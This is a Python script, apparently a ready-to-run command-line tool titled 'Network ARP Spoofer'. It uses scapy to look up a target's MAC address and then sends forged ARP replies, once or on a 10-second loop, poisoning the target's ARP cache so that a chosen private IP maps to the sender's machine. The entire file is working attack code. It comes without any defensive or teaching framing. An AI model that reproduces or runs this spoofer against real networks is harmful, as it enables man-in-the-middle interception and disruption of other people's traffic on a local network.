from scapy.all import *
from scapy.layers.l2 import Ether, ARP
import argparse
import ipaddress
import re
import socket
import time


# function for getting (MAC, IP) of default NIC for scapy (only windows)
def get_default_interface():
    print("[*] Getting default NIC MAC and IP...")
    # get MAC of default NIC
    my_default_mac = Ether().src
    # getting all NIC's
    interfaces = get_windows_if_list()
    # get IP of my_default_mac
    for i in interfaces:
        if i['mac'] == my_default_mac:
            for ip in i['ips']:
                if 'IPv4Address' in str(type(ipaddress.ip_address(ip))):
                    my_default_ip = ip
    print("[*] Default NIC [{}, {}].".format(my_default_ip, my_default_mac))
    return my_default_mac, my_default_ip


def get_target_mac(target_ip):
    print("[*] Getting MAC of target {}...".format(target_ip))
    answer = sr1(ARP(pdst=target_ip), verbose=0)
    print("[*] Target [{}, {}].".format(target_ip, answer[0][ARP].hwsrc))
    return answer[0][ARP].hwsrc


def spoof(target_ip, target_mac, spoofed_ip, my_mac):
    print("[*] Spoofing [{}, {}] to [{}, {}] cache...".format(spoofed_ip, my_mac, target_ip, target_mac))
    ether = Ether(src=my_mac, dst=target_mac)
    arp = ARP(hwsrc=my_mac, psrc=spoofed_ip, hwdst=target_mac, pdst=target_ip, op=2)
    spoofed_packet = ether / arp
    sendp(spoofed_packet, verbose=0)
    print("[*] Crafted ARP packet sent.")


def main():
    # Building arguments
    parser = argparse.ArgumentParser(description="Network ARP Spoofer",
                                     epilog="---------------------------------------------------------------")
    parser.add_argument("-ip", metavar="<IP>", help="Spoofed IP", required=True)
    parser.add_argument("-target", metavar="<TARGET IP/MAC>", help="Target to spoof (default: current host)",
                        default=None)
    parser.add_argument("-single", help="Send only 1 packet (default: loop every 10 seconds)", action="store_true")
    args = parser.parse_args()
    spoofed_ip = args.ip
    target = args.target
    one_time = args.single
    my_mac, my_ip = get_default_interface()
    if target is None:
        # set target to current host (default my_mac)
        target_mac, target_ip = my_mac, my_ip
    elif re.match("[0-9a-f]{2}([:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", target.lower()):
        target_mac = target
        target_ip = "255.255.255.255"
    else:
        try:
            # resolve IP address if hostname supplied
            target_ip = socket.gethostbyname(target)
        except:
            print("[-] ERROR: Unknown host.\n")
            return
        # resolve spoofed_ip to my_mac
        target_mac = get_target_mac(target_ip)

    # validate spoofed spoofed_ip
    if not ipaddress.IPv4Address(spoofed_ip).is_private:
        print("[-] ERROR: use private ipv4 address.")
        return

    if one_time:
        spoof(target_ip, target_mac, spoofed_ip, my_mac)
    else:
        while True:
            time.sleep(10)
            spoof(target_ip, target_mac, spoofed_ip, my_mac)


if __name__ == "__main__":
    try:
        # start script
        main()
    except KeyboardInterrupt:
        print("[*] script interrupted by user.\n")
        exit(0)
